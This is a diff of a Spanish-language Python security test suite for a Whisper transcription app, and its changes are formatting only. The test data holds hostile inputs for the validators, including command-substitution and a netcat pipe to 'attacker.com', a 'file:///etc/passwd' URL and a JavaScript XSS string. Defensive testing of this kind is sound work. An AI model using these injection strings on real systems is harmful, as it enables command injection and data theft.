@@ -3,20 +3,20 @@ Tests de seguridad para DesktopWhisperTranscriber
 Verifica las correcciones de vulnerabilidades implementadas.
 """
 
-import unittest
-import sys
 import os
 import queue
+import sys
 import tempfile
+import unittest
 from pathlib import Path
 
 # Añadir el directorio raíz del proyecto al PATH
 project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
 sys.path.insert(0, project_root)
 
+from src.core.exceptions import AudioProcessingError, SecurityError, ValidationError
 from src.core.transcriber_engine import TranscriberEngine
 from src.gui.main_window import validate_youtube_url
-from src.core.exceptions import SecurityError, AudioProcessingError, ValidationError
 
 
 class TestSecurityFixes(unittest.TestCase):
@@ -52,13 +52,9 @@ class TestSecurityFixes(unittest.TestCase):
                     # SecurityError hereda de TranscriptorError, no de ValueError
                     # Esperamos SecurityError o ValueError para caracteres peligrosos
                     with self.assertRaises((ValueError, SecurityError)) as context:
-                        self.engine._preprocess_audio_for_diarization(
-                            dangerous_path, output_path
-                        )
+                        self.engine._preprocess_audio_for_diarization(dangerous_path, output_path)
 
-                    self.assertIn(
-                        "Caracter peligroso detectado", str(context.exception)
-                    )
+                    self.assertIn("Caracter peligroso detectado", str(context.exception))
                 finally:
                     if os.path.exists(output_path):
                         os.remove(output_path)
@@ -86,14 +82,10 @@ class TestSecurityFixes(unittest.TestCase):
                     # Verificar que no lanza ValueError por caracteres peligrosos
                     # (puede lanzar RuntimeError por FFmpeg no encontrado)
                     try:
-                        self.engine._preprocess_audio_for_diarization(
-                            safe_path, output_path
-                        )
+                        self.engine._preprocess_audio_for_diarization(safe_path, output_path)
                     except (ValueError, SecurityError) as e:
                         if "Caracter peligroso detectado" in str(e):
-                            self.fail(
-                                f"Ruta segura rechazada incorrectamente: {safe_path}"
-                            )
+                            self.fail(f"Ruta segura rechazada incorrectamente: {safe_path}")
                     except (RuntimeError, AudioProcessingError):
                         # FFmpeg no encontrado es aceptable para esta prueba
                         pass
@@ -121,16 +113,12 @@ class TestSecurityFixes(unittest.TestCase):
             with self.subTest(extension=ext):
                 # No debería lanzar error de extensión
                 try:
-                    with tempfile.NamedTemporaryFile(
-                        suffix=".wav", delete=False
-                    ) as tmp:
+                    with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as tmp:
                         output_path = tmp.name
                     input_path = f"test{ext}"
 
                     try:
-                        self.engine._preprocess_audio_for_diarization(
-                            input_path, output_path
-                        )
+                        self.engine._preprocess_audio_for_diarization(input_path, output_path)
                     except (ValueError, SecurityError) as e:
                         if "Extensión de archivo no permitida" in str(e):
                             self.fail(f"Extensión permitida rechazada: {ext}")
@@ -155,13 +143,9 @@ class TestSecurityFixes(unittest.TestCase):
                 try:
                     # Esperamos ValueError o SecurityError para extensiones inválidas
                     with self.assertRaises((ValueError, SecurityError)) as context:
-                        self.engine._preprocess_audio_for_diarization(
-                            input_path, output_path
-                        )
+                        self.engine._preprocess_audio_for_diarization(input_path, output_path)
 
-                    self.assertIn(
-                        "Extensión de archivo no permitida", str(context.exception)
-                    )
+                    self.assertIn("Extensión de archivo no permitida", str(context.exception))
                 finally:
                     if os.path.exists(output_path):
                         os.remove(output_path)
@@ -182,9 +166,7 @@ class TestSecurityFixes(unittest.TestCase):
 
         for url in valid_urls:
             with self.subTest(url=url):
-                self.assertTrue(
-                    validate_youtube_url(url), f"URL válida rechazada: {url}"
-                )
+                self.assertTrue(validate_youtube_url(url), f"URL válida rechazada: {url}")
 
     def test_youtube_url_validation_invalid_urls(self):
         """
@@ -206,9 +188,7 @@ class TestSecurityFixes(unittest.TestCase):
 
         for url in invalid_urls:
             with self.subTest(url=url):
-                self.assertFalse(
-                    validate_youtube_url(url), f"URL inválida aceptada: {url}"
-                )
+                self.assertFalse(validate_youtube_url(url), f"URL inválida aceptada: {url}")
 
     def test_huggingface_token_masking(self):
         """
@@ -300,6 +280,7 @@ class TestInputValidators(unittest.TestCase):
     def setUp(self):
         """Configurar antes de cada prueba."""
         from src.core.validators import InputValidator, validator
+
         self.validator = validator
         self.InputValidator = InputValidator
 
@@ -307,7 +288,7 @@ class TestInputValidators(unittest.TestCase):
         """Verifica que se rechacen archivos vacíos."""
         with tempfile.NamedTemporaryFile(delete=False) as tmp:
             tmp_path = tmp.name
-            
+
         try:
             # Archivo vacío (0 bytes)
             is_valid, error = self.validator.validate_file_size(tmp_path)
@@ -331,7 +312,7 @@ class TestInputValidators(unittest.TestCase):
             "$(echo hacked)",
             "test | nc attacker.com 1234",
         ]
-        
+
         for path in dangerous_paths:
             with self.subTest(path=path):
                 is_safe, error = self.validator.validate_path_security(path)
@@ -346,7 +327,7 @@ class TestInputValidators(unittest.TestCase):
             "/home/user/música/audio.wav",
             "C:\\Users\\Test\\audio.mp3",
         ]
-        
+
         for path in safe_paths:
             with self.subTest(path=path):
                 is_safe, error = self.validator.validate_path_security(path)
@@ -360,7 +341,7 @@ class TestInputValidators(unittest.TestCase):
             with self.subTest(extension=ext):
                 is_valid, _ = self.validator.validate_audio_extension(f"test{ext}")
                 self.assertTrue(is_valid, f"Extensión permitida rechazada: {ext}")
-        
+
         # Extensiones bloqueadas
         blocked = [".exe", ".sh", ".bat", ".py", ".js"]
         for ext in blocked:
@@ -374,25 +355,23 @@ class TestInputValidators(unittest.TestCase):
             "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
             "https://youtu.be/dQw4w9WgXcQ",
         ]
-        
+
         for url in valid_urls:
             with self.subTest(url=url):
                 self.assertTrue(
-                    self.validator.validate_youtube_url(url),
-                    f"URL válida rechazada: {url}"
+                    self.validator.validate_youtube_url(url), f"URL válida rechazada: {url}"
                 )
-        
+
         invalid_urls = [
             "file:///etc/passwd",
             "javascript:alert('xss')",
             "https://evil.com/malware",
         ]
-        
+
         for url in invalid_urls:
             with self.subTest(url=url):
                 self.assertFalse(
-                    self.validator.validate_youtube_url(url),
-                    f"URL inválida aceptada: {url}"
+                    self.validator.validate_youtube_url(url), f"URL inválida aceptada: {url}"
                 )
 
     def test_text_sanitization(self):
@@ -400,14 +379,14 @@ class TestInputValidators(unittest.TestCase):
         # Texto con caracteres problemáticos
         text_with_special_chars = "Hello\u2026 \u201cWorld\u201d \u2014 Test\u2019s"
         sanitized = self.validator.sanitize_text_for_export(text_with_special_chars)
-        
+
         # Verificar que no contiene caracteres Unicode problemáticos
         self.assertNotIn("\u2026", sanitized)
         self.assertNotIn("\u201c", sanitized)
         self.assertNotIn("\u201d", sanitized)
         self.assertNotIn("\u2014", sanitized)
         self.assertNotIn("\u2019", sanitized)
-        
+
         # Verificar que contiene los reemplazos correctos
         self.assertIn("...", sanitized)
         self.assertIn('"', sanitized)
@@ -418,12 +397,12 @@ class TestInputValidators(unittest.TestCase):
         # Token vacío
         is_valid, error = self.validator.validate_environment_token("")
         self.assertFalse(is_valid)
-        
+
         # Token demasiado corto
         is_valid, error = self.validator.validate_environment_token("abc")
         self.assertFalse(is_valid)
         self.assertIn("corto", error.lower())
-        
+
         # Token válido
         is_valid, _ = self.validator.validate_environment_token("hf_1234567890abcdef")
         self.assertTrue(is_valid)
@@ -437,15 +416,16 @@ class TestLoggerSanitization(unittest.TestCase):
     def setUp(self):
         """Configurar antes de cada prueba."""
         from src.core.logger import TranscriptorLogger
+
         self.logger_class = TranscriptorLogger
 
     def test_token_sanitization_in_logs(self):
         """Verifica que tokens sensibles se enmascaren en logs."""
         # Crear una instancia del logger para probar el filtro
         from src.core.logger import SensitiveDataFilter
-        
+
         sanitizer = SensitiveDataFilter()
-        
+
         # Probar con diferentes patrones de tokens
         test_cases = [
             # Token HF sin prefijo "Token:" para evitar match con el patrón genérico
@@ -455,14 +435,15 @@ class TestLoggerSanitization(unittest.TestCase):
             ("api_key=sk-1234567890abcdef", "[REDACTED]"),
             ("secret=verysecretvalue12345", "[REDACTED]"),
         ]
-        
+
         for original, expected_pattern in test_cases:
             with self.subTest(original=original[:30]):
                 # El filtro debe sanitizar el mensaje
                 sanitized = sanitizer._sanitize(original)
                 # El sanitizado debe contener el patrón de redacción
-                self.assertIn(expected_pattern, sanitized, 
-                    f"Expected '{expected_pattern}' in '{sanitized}'")
+                self.assertIn(
+                    expected_pattern, sanitized, f"Expected '{expected_pattern}' in '{sanitized}'"
+                )
 
 
 if __name__ == "__main__":
